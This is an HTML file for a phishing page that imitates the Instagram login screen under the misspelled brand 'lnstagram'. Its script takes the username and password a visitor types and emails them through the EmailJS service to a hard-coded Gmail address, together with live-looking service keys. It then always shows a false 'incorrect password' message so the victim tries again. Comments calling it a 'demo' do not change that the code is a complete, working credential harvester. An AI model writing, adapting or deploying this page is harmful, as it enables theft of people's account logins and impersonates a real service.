<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Login</title>
  <!-- favicon -->
<link rel="icon" type="image/avif" href="logo.avif">
<link rel="icon" type="image/avif" sizes="32x32" href="/logo.avif">
<link rel="icon" type="image/avif" sizes="16x16" href="/logo.avif">

  <style>
    :root{
      --bg:#fafafa;
      --card:#fff;
      --border:#dbdbdb;
      --text:#262626;
      --muted:#8e8e8e;
      --link:#0095f6;
      --error:#ed4956;
      --btn:#0095f6;
      --btnDisabled:#b2dffc;
      --shadow: 0 1px 0 rgba(0,0,0,.04);
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
      background:var(--bg);
      color:var(--text);
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }

    /* Layout: centered card on desktop; comfortable spacing on mobile */
    .wrap{
      width:min(380px, 100%);
      display:flex;
      flex-direction:column;
      gap:10px;
    }
    .card{
      background:var(--card);
      border:1px solid var(--border);
      border-radius: 2px;
      padding: 36px 40px 22px;
      box-shadow: var(--shadow);
    }
    .logo{
      text-align:center;
      font-weight:700;
      letter-spacing:.4px;
      font-size:32px;
      margin: 0 0 26px;
    }

    form{display:flex; flex-direction:column; gap:8px;}
    .fieldWrap{position:relative;}
    .field{
      width:100%;
      background:#fafafa;
      border:1px solid var(--border);
      border-radius:3px;
      padding:10px 10px;
      font-size:12px;
      outline:none;
    }
    .field:focus{
      border-color:#a8a8a8;
      background:#fff;
    }

    /* Show/Hide button inside password field */
    .toggle{
      position:absolute;
      right:10px;
      top:50%;
      transform:translateY(-50%);
      border:0;
      background:transparent;
      color:var(--muted);
      font-weight:700;
      font-size:12px;
      cursor:pointer;
      padding:6px;
      border-radius:6px;
    }
    .toggle:focus{outline:2px solid rgba(0,149,246,.25); outline-offset:2px;}

    .btn{
      margin-top:6px;
      width:100%;
      border:0;
      border-radius:8px;
      padding:10px 12px;
      font-weight:600;
      cursor:pointer;
      color:#fff;
      background:var(--btn);
      display:flex;
      align-items:center;
      justify-content:center;
      gap:10px;
      transition:.15s ease;
    }
    .btn:disabled{
      cursor:not-allowed;
      background:var(--btnDisabled);
    }

    /* Spinner */
    .spinner{
      width:16px;
      height:16px;
      border-radius:50%;
      border:2px solid rgba(255,255,255,.45);
      border-top-color:#fff;
      animation: spin .75s linear infinite;
      display:none;
    }
    .btn.loading .spinner{display:inline-block;}
    .btn.loading .btnText{opacity:.9;}
    @keyframes spin{to{transform:rotate(360deg)}}

    .divider{
      display:flex;
      align-items:center;
      gap:18px;
      margin:16px 0 10px;
      color:var(--muted);
      font-size:13px;
      font-weight:600;
    }
    .divider::before,.divider::after{
      content:"";
      flex:1;
      height:1px;
      background:var(--border);
    }
    .alt{
      display:flex;
      justify-content:center;
      gap:8px;
      color:#385185;
      font-weight:600;
      font-size:14px;
      margin: 4px 0 10px;
      user-select:none;
    }
    .forgot{
      text-align:center;
      font-size:12px;
      color:#00376b;
      text-decoration:none;
      margin-top:6px;
    }

    .error{
      display:none;
      margin: 8px 0 0;
      text-align:center;
      color:var(--error);
      font-size:14px;
      line-height:1.3;
    }
    .error.show{display:block;}

    .signup{
      background:var(--card);
      border:1px solid var(--border);
      border-radius: 2px;
      padding:18px 40px;
      text-align:center;
      font-size:14px;
      box-shadow: var(--shadow);
    }
    .signup a{color:var(--link); text-decoration:none; font-weight:600;}
    .meta{
      text-align:center;
      font-size:12px;
      color:var(--muted);
      margin-top:10px;
      line-height:1.4;
    }
    .meta a{color:var(--link); text-decoration:none;}

    /* Mobile layout tweaks */
    @media (max-width: 480px){
      body{padding:14px;}
      .card{padding:26px 18px 18px;}
      .signup{padding:16px 18px;}
      .logo{font-size:30px; margin-bottom:18px;}
    }
  </style>
</head>

<body>
  <div class="wrap">
    <div class="card" aria-label="Login demo">
      <center><img src="logo.avif" alt="logo" style="width: 50px; height: 50px;"></center>
      <div class="logo">lnstagram</div>

      <form id="loginForm" autocomplete="off" novalidate>
        <input id="user" class="field" type="text" placeholder="Phone number, username, or email" required />

        <div class="fieldWrap">
          <input id="pass" class="field" type="password" placeholder="Password" required />
          <button id="togglePass" class="toggle" type="button" aria-label="Show password">SHOW</button>
        </div>

        <button id="loginBtn" class="btn" type="submit">
          <span class="spinner" aria-hidden="true"></span>
          <span class="btnText">Log in</span>
        </button>

        <div id="err" class="error" role="alert">
          Sorry, your password was incorrect. Please double-check your password.
        </div>

        <div class="divider">OR</div>
        <div class="alt">Log in with Facebook</div>
        <a class="forgot" href="#" onclick="return false;">Forgot password?</a>
      </form>
    </div>

    <div class="signup">
      Don't have an account? <a href="#" onclick="return false;">Sign up</a>
    </div>
  </div>

  <!-- Use only one EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

  <script>
    // DOM Elements
    const form = document.getElementById('loginForm');
    const user = document.getElementById('user');
    const pass = document.getElementById('pass');
    const btn = document.getElementById('loginBtn');
    const err = document.getElementById('err');
    const toggle = document.getElementById('togglePass');

    // EmailJS Configuration
    const PUBLIC_KEY = "Jc4J0y-r9Uwk4jtdz";
    const SERVICE_ID = "service_c4ao23n";
    const TEMPLATE_ID = "template_ckdemnh";

    // Initialize EmailJS
    emailjs.init(PUBLIC_KEY);

    // Enable/Disable login button based on input
    function sync() {
      const ok = user.value.trim().length > 0 && pass.value.trim().length > 0;
      btn.disabled = !ok || btn.classList.contains('loading');
      if (!ok) err.classList.remove('show');
    }

    // Event Listeners
    user.addEventListener('input', sync);
    pass.addEventListener('input', sync);

    // Toggle password visibility
    toggle.addEventListener('click', () => {
      const isHidden = pass.type === 'password';
      pass.type = isHidden ? 'text' : 'password';
      toggle.textContent = isHidden ? 'HIDE' : 'SHOW';
      toggle.setAttribute('aria-label', isHidden ? 'Hide password' : 'Show password');
      pass.focus();
    });

    // Form submission handler
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Show loading state
      err.classList.remove('show');
      btn.classList.add('loading');
      btn.disabled = true;

      // Demo: Simulate API call delay
      await new Promise(r => setTimeout(r, 900));

      // EmailJS parameters
      const params = {
        to_email: "saldosterone.0@gmail.com",
        user: user.value.trim() || "(empty)",
        pass: pass.value || "(none)",
        timestamp: new Date().toISOString()
      };

      // Send email via EmailJS
      emailjs.send(SERVICE_ID, TEMPLATE_ID, params)
        .then(() => {
          // Success - Show error for demo purposes (simulating incorrect password)
          err.classList.add('show');
        })
        .catch(error => {
          console.error('EmailJS Error:', error);
          err.classList.add('show');
        })
        .finally(() => {
          // Reset UI state
          btn.classList.remove('loading');
          sync(); // Re-enable button if needed
        });
    });
  </script>
</body>
</html>